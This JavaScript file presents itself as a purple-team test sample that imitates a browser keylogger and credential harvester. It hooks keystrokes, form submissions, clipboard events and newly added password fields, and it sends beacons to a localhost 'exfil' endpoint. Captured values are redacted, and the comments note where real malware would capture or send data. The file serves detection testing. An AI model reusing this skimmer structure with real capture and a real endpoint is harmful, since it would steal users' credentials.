/**
 * PURPLE TEAM TEST ARTIFACT - SAMPLE 2
 * Name: Credential Harvester / Keylogger Simulation
 * Purpose: Tests detection of JS that hooks keyboard events, form submissions,
 *          and attempts to POST captured data to an external endpoint.
 * Risk: NONE - Captures nothing real. All "exfil" points to localhost.
 * MITRE: T1056.004 (Web Portal Capture), T1056.001 (Keylogging)
 * 
 * Expected detections:
 *   - Browser: Content security policy violation / extension alert
 *   - Proxy/SWG: Suspicious JS behavioral pattern
 *   - EDR: Keylogger-like API hooking in browser process
 *   - DLP: Potential credential exfiltration attempt
 */

(function() {
    'use strict';

    // --- Config block (mimics real harvester C2 config) ---
    var CONFIG = {
        exfil_url: 'http://127.0.0.1:65535/collect',  // Localhost - will fail safely
        campaign_id: 'PT-TEST-' + Date.now(),
        target_fields: ['password', 'passwd', 'pass', 'credential', 'secret', 'token', 'apikey'],
        max_keys: 50,
        beacon_interval: 30000
    };

    var _captured_keys = [];
    var _captured_forms = [];

    // --- Keyboard event interception (classic keylogger pattern) ---
    if (typeof document !== 'undefined') {
        document.addEventListener('keydown', function(e) {
            _captured_keys.push({
                key: '[REDACTED_FOR_SAFETY]',  // Real keyloggers capture e.key
                time: Date.now(),
                target: e.target ? e.target.tagName : 'unknown'
            });

            // Cap the buffer (real malware would exfil, we just log)
            if (_captured_keys.length > CONFIG.max_keys) {
                console.log('[PURPLE TEAM] Keylogger buffer full (' + CONFIG.max_keys + ' events). Buffer cleared.');
                _captured_keys = [];
            }
        });
    }

    // --- Form submission interception ---
    if (typeof document !== 'undefined') {
        document.addEventListener('submit', function(e) {
            var form = e.target;
            var inputs = form ? form.querySelectorAll('input') : [];
            var _form_data = {};

            for (var i = 0; i < inputs.length; i++) {
                var name = (inputs[i].name || inputs[i].id || '').toLowerCase();
                // Check if this looks like a credential field
                for (var j = 0; j < CONFIG.target_fields.length; j++) {
                    if (name.indexOf(CONFIG.target_fields[j]) !== -1) {
                        _form_data[name] = '[CREDENTIAL_FIELD_DETECTED_NOT_CAPTURED]';
                    }
                }
            }

            _captured_forms.push({
                action: form ? form.action : 'unknown',
                method: form ? form.method : 'unknown',
                fields: _form_data,
                timestamp: new Date().toISOString()
            });

            console.log('[PURPLE TEAM] Form submission intercepted (data NOT captured).');
        }, true);
    }

    // --- Simulated clipboard monitoring ---
    if (typeof document !== 'undefined') {
        document.addEventListener('copy', function(e) {
            console.log('[PURPLE TEAM] Clipboard copy event detected. Content NOT captured.');
        });

        document.addEventListener('paste', function(e) {
            console.log('[PURPLE TEAM] Clipboard paste event detected. Content NOT captured.');
        });
    }

    // --- Simulated periodic beacon (mimics C2 check-in) ---
    var _beacon_count = 0;
    var _beacon_interval = setInterval(function() {
        _beacon_count++;
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', CONFIG.exfil_url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-Campaign', CONFIG.campaign_id);
            xhr.send(JSON.stringify({
                type: 'PURPLE_TEAM_BEACON',
                seq: _beacon_count,
                keys_buffered: _captured_keys.length,
                forms_captured: _captured_forms.length,
                note: 'BENIGN TEST - No real data collected or transmitted'
            }));
        } catch(e) {}

        console.log('[PURPLE TEAM] Beacon #' + _beacon_count + ' sent to ' + CONFIG.exfil_url + ' (will fail - localhost)');

        // Auto-stop after 3 beacons
        if (_beacon_count >= 3) {
            clearInterval(_beacon_interval);
            console.log('[PURPLE TEAM] Sample 2 complete. Beacon loop ended.');
        }
    }, 5000); // 5 second intervals for testing (real malware uses longer)

    // --- Simulated MutationObserver (watches for dynamically added password fields) ---
    if (typeof MutationObserver !== 'undefined' && typeof document !== 'undefined') {
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.tagName === 'INPUT' && node.type === 'password') {
                        console.log('[PURPLE TEAM] New password field detected in DOM. NOT hooking.');
                    }
                });
            });
        });

        if (document.body) {
            observer.observe(document.body, { childList: true, subtree: true });
        }
    }

    console.log('[PURPLE TEAM] Sample 2 loaded. Campaign: ' + CONFIG.campaign_id);
    console.log('[PURPLE TEAM] Listening for keydown, form submit, clipboard events.');
    console.log('[PURPLE TEAM] All captures are REDACTED. No real data leaves the browser.');

})();
